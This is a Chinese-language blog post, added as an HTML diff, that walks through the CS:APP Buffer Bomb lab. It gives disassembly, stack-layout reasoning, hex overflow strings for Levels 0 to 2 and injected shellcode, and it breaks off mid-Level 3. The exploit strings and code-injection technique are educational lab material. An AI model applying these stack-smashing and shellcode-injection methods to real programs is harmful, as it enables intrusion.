@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="the Buffer Bomb事先准备 bufbomb反汇编 objdump -d bufbomb &gt; asm.txt  获取自己的cookie 12Userid: existoCookie: 0x73413ee0   Level 0: Candle要求在getbuf执行返回语句之前调用smoke函数，我们考虑利用缓冲区溢出的漏洞来修改getbuf函数的返回地址 12345678910111">
+<meta property="og:type" content="article">
+<meta property="og:title" content="the Buffer Bomb">
+<meta property="og:url" content="http://example.com/2021/12/25/bufbomb/index.html">
+<meta property="og:site_name" content="Existo&#39;s Blog">
+<meta property="og:description" content="the Buffer Bomb事先准备 bufbomb反汇编 objdump -d bufbomb &gt; asm.txt  获取自己的cookie 12Userid: existoCookie: 0x73413ee0   Level 0: Candle要求在getbuf执行返回语句之前调用smoke函数，我们考虑利用缓冲区溢出的漏洞来修改getbuf函数的返回地址 12345678910111">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631615.png">
+<meta property="og:image" content="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631617.png">
+<meta property="og:image" content="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631618.png">
+<meta property="og:image" content="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631619.png">
+<meta property="og:image" content="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631620.png">
+<meta property="og:image" content="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631621.png">
+<meta property="og:image" content="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631622.png">
+<meta property="article:published_time" content="2021-12-25T08:10:08.000Z">
+<meta property="article:modified_time" content="2021-12-26T08:31:50.383Z">
+<meta property="article:author" content="Existo">
+<meta property="article:tag" content="汇编语言">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631615.png">
+
+<link rel="canonical" href="http://example.com/2021/12/25/bufbomb/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>the Buffer Bomb | Existo's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Existo's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/25/bufbomb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Existo">
+      <meta itemprop="description" content="Hello Nerd">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Existo's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          the Buffer Bomb
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-25 16:10:08" itemprop="dateCreated datePublished" datetime="2021-12-25T16:10:08+08:00">2021-12-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-26 16:31:50" itemprop="dateModified" datetime="2021-12-26T16:31:50+08:00">2021-12-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="the-Buffer-Bomb"><a href="#the-Buffer-Bomb" class="headerlink" title="the Buffer Bomb"></a>the Buffer Bomb</h1><h2 id="事先准备"><a href="#事先准备" class="headerlink" title="事先准备"></a>事先准备</h2><ul>
+<li><p><code>bufbomb</code>反汇编</p>
+<p><code>objdump -d bufbomb &gt; asm.txt</code></p>
+</li>
+<li><p>获取自己的<code>cookie</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Userid: existo</span><br><span class="line">Cookie: 0x73413ee0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0: Candle"></a>Level 0: Candle</h2><p>要求在<code>getbuf</code>执行返回语句之前调用<code>smoke</code>函数，我们考虑利用缓冲区溢出的漏洞来修改<code>getbuf</code>函数的返回地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049342 &lt;getbuf&gt;:</span><br><span class="line"> 8049342:	55                   	push   %ebp</span><br><span class="line"> 8049343:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049345:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8049348:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804934b:	8d 45 ce             	lea    -0x32(%ebp),%eax</span><br><span class="line"> 804934e:	50                   	push   %eax</span><br><span class="line"> 804934f:	e8 ba fa ff ff       	call   8048e0e &lt;Gets&gt;</span><br><span class="line"> 8049354:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8049357:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 804935c:	c9                   	leave  </span><br><span class="line"> 804935d:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+<p>观察汇编指令，发现分配给字符串的空间是从<code>%ebp - 0x32</code>开始的，<code>0x32</code>也就是<code>50</code>个字节，返回地址在<code>%ebp + 0x4</code>处，而<code>push %ebp</code>又占用<code>4</code>个字节，因此整个结构便有<code>0x32 + 0x4 + 0x4</code>一共<code>58</code>个字节，我们要做的是，将<code>smoke</code>函数的开始地址覆盖<code>getbuf</code>的最后<code>4</code>个字节的返回地址，这样执行完<code>getbuf</code>函数后就会跳转到我们想要的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">08048ba1 &lt;smoke&gt;:</span><br><span class="line"> 8048ba1:	55                   	push   %ebp</span><br><span class="line"> 8048ba2:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048ba4:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048ba7:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048baa:	68 30 a3 04 08       	push   $0x804a330</span><br><span class="line"> 8048baf:	e8 5c fd ff ff       	call   8048910 &lt;puts@plt&gt;</span><br><span class="line"> 8048bb4:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bb7:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bba:	6a 00                	push   $0x0</span><br><span class="line"> 8048bbc:	e8 fe 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048bc1:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bc4:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bc7:	6a 00                	push   $0x0</span><br><span class="line"> 8048bc9:	e8 52 fd ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>观察到<code>smoke</code>函数的起始地址为<code>0x08048ba1</code>，因此我们将前<code>58 - 4 = 54</code>字节用任意值填满即可，最后<code>4</code>字节放上我们的<code>0x08048ba1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*level 0*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 /*54个任意值*/</span><br><span class="line">a1 8b 04 08</span><br></pre></td></tr></table></figure>
+<p>储存为<code>level0.txt</code>文件，再使用提供的<code>hex2raw</code>程序转化为题目需要的<code>string</code></p>
+<p><code>./hex2raw &lt; level0.txt &gt; level0-raw.txt</code></p>
+<p>之后的题目都是这个办法，因此不再赘述(除了<code>level4</code>需要加<code>-n</code>)</p>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631615.png" alt="image-20211225165024232" style="zoom:80%;" /></p>
+<p><code>level 0</code>得解</p>
+<h2 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1: Sparkler"></a>Level 1: Sparkler</h2><p>要求和<code>level 0</code>类似，只不过这次要调用<code>fizz</code>函数，<code>fizz</code>函数需要输入一个参数，要求此参数是我们每个人独有的<code>cookie</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">08048bce &lt;fizz&gt;:</span><br><span class="line"> 8048bce:	55                   	push   %ebp</span><br><span class="line"> 8048bcf:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048bd1:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048bd4:	8b 55 08             	mov    0x8(%ebp),%edx</span><br><span class="line"> 8048bd7:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048bdc:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048bde:	75 22                	jne    8048c02 &lt;fizz+0x34&gt;</span><br><span class="line"> 8048be0:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048be3:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048be6:	68 4b a3 04 08       	push   $0x804a34b</span><br><span class="line"> 8048beb:	e8 50 fc ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048bf0:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bf3:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bf6:	6a 01                	push   $0x1</span><br><span class="line"> 8048bf8:	e8 c2 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048bfd:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c00:	eb 13                	jmp    8048c15 &lt;fizz+0x47&gt;</span><br><span class="line"> 8048c02:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c05:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048c08:	68 6c a3 04 08       	push   $0x804a36c</span><br><span class="line"> 8048c0d:	e8 2e fc ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c12:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c15:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c18:	6a 00                	push   $0x0</span><br><span class="line"> 8048c1a:	e8 01 fd ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>可以观察到<code>fizz</code>函数的起始地址<code>0x08048bce</code>，与<code>level 0</code>相似我们首先还是需要覆盖<code>getbuf</code>的返回地址为<code>0x08048bce</code>，先保证调用<code>fizz</code>函数，<code>fizz</code>函数中将参数放在<code>0x8(%ebp)</code>位置，此<code>%ebp</code>为新<code>ebp</code>，既是<code>getbuf</code>返回地址处新<code>push</code>的<code>%ebp</code>，因此我们需要将<code>cookie</code>放在新<code>%ebp+0x8</code>位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/*level 1*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 /*54个任意值*/</span><br><span class="line">ce 8b 04 08 /*fizz地址*/</span><br><span class="line">00 00 00 00 /*%ebp+0x4*/</span><br><span class="line">e0 3e 41 73 /*%ebp+0x8处放cookie*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631617.png" alt="image-20211225170427364" style="zoom:80%;" /></p>
+<p><code>level 1</code>得解</p>
+<h2 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2: Firecracker"></a>Level 2: Firecracker</h2><p>任务要求仍然是在<code>getbuf</code>执行返回语句之前调用其他函数，这次调用<code>bang</code>函数，并且要求将<code>global_value</code>设置成自己的<code>cookie</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">08048c1f &lt;bang&gt;:</span><br><span class="line"> 8048c1f:	55                   	push   %ebp</span><br><span class="line"> 8048c20:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c22:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c25:	a1 40 d1 04 08       	mov    0x804d140,%eax</span><br><span class="line"> 8048c2a:	89 c2                	mov    %eax,%edx</span><br><span class="line"> 8048c2c:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048c31:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048c33:	75 25                	jne    8048c5a &lt;bang+0x3b&gt;</span><br><span class="line"> 8048c35:	a1 40 d1 04 08       	mov    0x804d140,%eax</span><br><span class="line"> 8048c3a:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c3d:	50                   	push   %eax</span><br><span class="line"> 8048c3e:	68 8c a3 04 08       	push   $0x804a38c</span><br><span class="line"> 8048c43:	e8 f8 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c48:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c4b:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c4e:	6a 02                	push   $0x2</span><br><span class="line"> 8048c50:	e8 6a 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048c55:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c58:	eb 16                	jmp    8048c70 &lt;bang+0x51&gt;</span><br><span class="line"> 8048c5a:	a1 40 d1 04 08       	mov    0x804d140,%eax</span><br><span class="line"> 8048c5f:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c62:	50                   	push   %eax</span><br><span class="line"> 8048c63:	68 b1 a3 04 08       	push   $0x804a3b1</span><br><span class="line"> 8048c68:	e8 d3 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c6d:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c70:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c73:	6a 00                	push   $0x0</span><br><span class="line"> 8048c75:	e8 a6 fc ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>注意到两个参数，一个<code>0x804d140</code>，一个<code>0x804d138</code>，我们需要知道哪个是<code>global_value</code></p>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631618.png" alt="image-20211225172506382"></p>
+<p>经过<code>gdb</code>调试发现<code>0x804d140</code>就是我们要修改的参数，所以我们的任务就是</p>
+<ul>
+<li>修改<code>global_value</code>为我们自己的<code>cookie</code></li>
+<li>将<code>bang</code>函数起始地址<code>0x08048c1f</code>压栈</li>
+<li><code>ret</code>指令执行<code>bang</code>函数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*汇编代码*/</span><br><span class="line">movl $0x73413ee0, 0x804d140</span><br><span class="line">push $0x08048c1f</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>将汇编代码转化为机器码</p>
+<p><code>gcc -c fun2.s</code></p>
+<p><code>objdump -d fun2.o</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*机器码*/</span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	c7 05 40 d1 04 08 e0 	movl   $0x73413ee0,0x804d140</span><br><span class="line">   7:	3e 41 73 </span><br><span class="line">   a:	68 1f 8c 04 08       	push   $0x8048c1f</span><br><span class="line">   f:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>问题来了，如何让程序执行我们的汇编代码，我们可以将<code>getbuf</code>的返回地址改为我们的代码的起始地址，这样程序就会执行我们的代码，修改变量并进入<code>bang</code>函数，那么首先我们得找出我们的函数的起始地址，肯定不是<code>0x00000000</code>，那么是啥呢，我们知道我们是通过字符串的溢出修改的代码，那么我们的字符串的首地址不就是我们的函数代码起始地址吗，知道了这个，我们只要找到字符串的首地址即可，从<code>getbuf</code>里找</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049342 &lt;getbuf&gt;:</span><br><span class="line"> 8049342:	55                   	push   %ebp</span><br><span class="line"> 8049343:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049345:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8049348:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804934b:	8d 45 ce             	lea    -0x32(%ebp),%eax</span><br><span class="line"> 804934e:	50                   	push   %eax</span><br><span class="line"> 804934f:	e8 ba fa ff ff       	call   8048e0e &lt;Gets&gt;</span><br><span class="line"> 8049354:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8049357:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 804935c:	c9                   	leave  </span><br><span class="line"> 804935d:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+<p>我们看到再调用<code>Gets</code>函数之前<code>push</code>了<code>%eax</code>，那么这个<code>%eax</code>就是字符串的首地址，也就是我们函数的起始地址，于是我们只要在调用<code>Gets</code>前设置一个断点，然后检查<code>%eax</code>的值即可</p>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631619.png" alt="image-20211225173935811"></p>
+<p>所以我们<code>%eax</code>的值为<code>0x55682f5e</code>，既是我们函数的起始地址，覆盖<code>getbuf</code>的返回地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c7 05 40 d1 04 08 e0 </span><br><span class="line">3e 41 73 </span><br><span class="line">68 1f 8c 04 08 </span><br><span class="line">c3 /*函数代码*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">5e 2f 68 55/*%eax地址*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631620.png" alt="image-20211225175046375" style="zoom:80%;" /></p>
+<p><code>level 2</code>得解</p>
+<h2 id="Level-3-Dynamite"><a href="#Level-3-Dynamite" class="headerlink" title="Level 3: Dynamite"></a>Level 3: Dynamite</h2><p>任务要求正常调用<code>getbuf</code>，但是修改<code>getbuf</code>的返回值为我们的<code>cookie</code>(原本为<code>1</code>)，同时要求栈空间被还原，既复原<code>saved ebp</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">08048c7a &lt;test&gt;:</span><br><span class="line"> 8048c7a:	55                   	push   %ebp</span><br><span class="line"> 8048c7b:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c7d:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048c80:	e8 48 04 00 00       	call   80490cd &lt;uniqueval&gt;</span><br><span class="line"> 8048c85:	89 45 f0             	mov    %eax,-0x10(%ebp)</span><br><span class="line"> 8048c88:	e8 b5 06 00 00       	call   8049342 &lt;getbuf&gt;</span><br><span class="line"> 8048c8d:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048c90:	e8 38 04 00 00       	call   80490cd &lt;uniqueval&gt;</span><br><span class="line"> 8048c95:	89 c2                	mov    %eax,%edx</span><br><span class="line"> 8048c97:	8b 45 f0             	mov    -0x10(%ebp),%eax</span><br><span class="line"> 8048c9a:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048c9c:	74 12                	je     8048cb0 &lt;test+0x36&gt;</span><br><span class="line"> 8048c9e:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048ca1:	68 d0 a3 04 08       	push   $0x804a3d0</span><br><span class="line"> 8048ca6:	e8 65 fc ff ff       	call   8048910 &lt;puts@plt&gt;</span><br><span class="line"> 8048cab:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048cae:	eb 41                	jmp    8048cf1 &lt;test+0x77&gt;</span><br><span class="line"> 8048cb0:	8b 55 f4             	mov    